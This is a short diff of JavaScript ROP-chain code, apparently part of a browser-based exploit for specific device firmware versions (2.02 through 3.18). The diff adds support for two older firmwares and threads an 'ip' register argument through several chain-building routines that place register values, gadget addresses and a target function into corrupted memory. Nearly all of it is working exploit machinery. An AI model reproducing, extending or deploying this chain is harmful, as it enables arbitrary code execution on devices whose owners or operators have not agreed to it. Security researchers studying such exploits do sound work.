@@ -1,5 +1,5 @@
 /*
-    ROP planning (Firmware 3.00, 3.01, 3.15 and 3.18)
+    ROP planning (Firmware 2.02, 2.12, 3.00, 3.01, 3.15 and 3.18)
 */
 
 /*
@@ -115,7 +115,7 @@ function get_caller(tmpmem, element, vtidx, fkvtable, version)
 {
     return function (fcn, libraries)
 	{
-        return function(r0, r1, r2, r3)
+        return function(r0, r1, r2, r3, ip)
 		{
             var allocate_tmp = init_memory(tmpmem);
             var context_size = 0x30;
@@ -170,7 +170,7 @@ function get_caller(tmpmem, element, vtidx, fkvtable, version)
 				aspace32[((r2values + 4) / 4)] = r1;                           	// r1
 				aspace32[((r2values + 8) / 4)] = r2;                           	// r2
 				aspace32[((r2values + 12) / 4)] = r3;		                    // r3
-				aspace32[((r2values + 16) / 4)] = 0x0;                          // ip
+				aspace32[((r2values + 16) / 4)] = ip;                           // ip
 				aspace32[((r2values + 20) / 4)] = scewkggts.ldmr4_2;            // lr
 				aspace32[((r2values + 24) / 4)] = fcn;              			// pc
 				
@@ -236,7 +236,7 @@ function get_caller(tmpmem, element, vtidx, fkvtable, version)
 				aspace32[((r8values + 8) / 4)] = r2;                            // r2
 				aspace32[((r8values + 12) / 4)] = r4values_1;                   // r4
 				aspace32[((r8values + 16) / 4)] = 0x0; 		                    // r5
-				aspace32[((r8values + 20) / 4)] = 0x0;                          // ip
+				aspace32[((r8values + 20) / 4)] = ip;                           // ip
 				aspace32[((r8values + 24) / 4)] = scewkggts.ldmr4_1;            // lr
 				aspace32[((r8values + 28) / 4)] = fcn;                          // pc (actual function)
 
@@ -304,7 +304,7 @@ function get_caller(tmpmem, element, vtidx, fkvtable, version)
 				aspace32[((r8values + 8) / 4)] = r2;                            // r2
 				aspace32[((r8values + 12) / 4)] = r4values; 		            // r4
 				aspace32[((r8values + 16) / 4)] = r5values;                     // r5
-				aspace32[((r8values + 20) / 4)] = 0x0;                          // ip
+				aspace32[((r8values + 20) / 4)] = ip;                           // ip
 				aspace32[((r8values + 24) / 4)] = scewkggts.ldmr4;              // lr
 				aspace32[((r8values + 28) / 4)] = fcn;                          // pc (actual function)
 				
@@ -365,7 +365,7 @@ function get_caller(tmpmem, element, vtidx, fkvtable, version)
 				aspace32[((r8values + 8) / 4)] = r2;                            // r2
 				aspace32[((r8values + 12) / 4)] = r4values_0;                   // r4
 				aspace32[((r8values + 16) / 4)] = r5values;                     // r5
-				aspace32[((r8values + 20) / 4)] = 0x0;                          // ip
+				aspace32[((r8values + 20) / 4)] = ip;                           // ip
 				aspace32[((r8values + 24) / 4)] = scewkggts.ldmr5;              // lr
 				aspace32[((r8values + 28) / 4)] = fcn;                          // pc (actual function)
 
